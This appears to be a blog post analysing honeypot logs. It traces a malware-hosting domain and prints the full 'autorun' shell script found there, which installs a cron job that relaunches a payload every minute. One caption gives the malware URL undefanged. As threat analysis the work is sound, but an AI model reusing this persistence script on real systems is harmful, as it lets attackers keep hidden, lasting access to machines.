### The story
I was looking at my honey pot logs using the following command.<br>
<br>
`cat cowrie.json* | jq '. | select(.eventid | contains("cowrie.session.file_download")) | .url' | grep -v "null" | sort | uniq -c | sort -bgr | head -n 10`
The command scrapes the log files and displays the top 10 URLS that were used to download files. 

Usually the top 10 contains IP's not domains. The last result caught my eye because it contained the domain name: http://chairfiller[.]org/smtp.

The first thing I did was use  the tool, Dirseach on the domain. This tool uses a list of popular file names and will check to see
if the file exists.

The Figure above shows the files and directories that were found by the tool. 
<ul>
  <li>/authorized_keys</li>
  <li>/a</li>
  <li>/echo</li>
  <li>/f</li>
  <li>/archive.zip</li>
  <li>/perl</li>
  <li>/phptest.php</li>
  <li>/setup</li>
  <li>/test</li>
</ul>  

The list above shows some of the more intresting files.

The Figure above shows that when you visit `chairfiller[.]org/a` the visitor is shown the file system where there is a hidden directory named .b.

The Figure above shows the contents of the `chairfiller[.]org/a/.b/` directory. The contents of the directory contains files for windows and linux based operating systems. 

One of the files in the directory is a file named autorun. 

```bash
#!/bin/sh
pwd > dir
dir=$(cat dir)
echo "* * * * * $dir/update >/dev/null 2>&1" > cron
crontab cron
crontab -l | grep update
echo "#!/bin/sh
if test -r $dir/pid; then
pid=\$(cat $dir/pid)
if \$(kill -CHLD \$pid >/dev/null 2>&1)
then
exit 0
fi
fi
cd $dir
./run &>/dev/null" > update
chmod u+x update

```
The Figure above shows the contents of the file located at `http://chairfiller.org/a/.b/autorun`.

The autorun Figure shown above is a Bash script. The first thing the script does create a new that will contain the machine's home directory file path. This file is named dir. Next the script creates a variable named dir. Whe $dir is called the script will use the cat command to read the contents of the dir file. After that variable is created the script will use the echo command to create a new cron job that will use the $dir variable created earlier to get the machines home path. The next line is where the script will add the cron to the crontab. 

The script use the the command `crontab -l` to list the machines cronjob.The script will also use the `grep` command to look for cronjobs that contain the string "update".
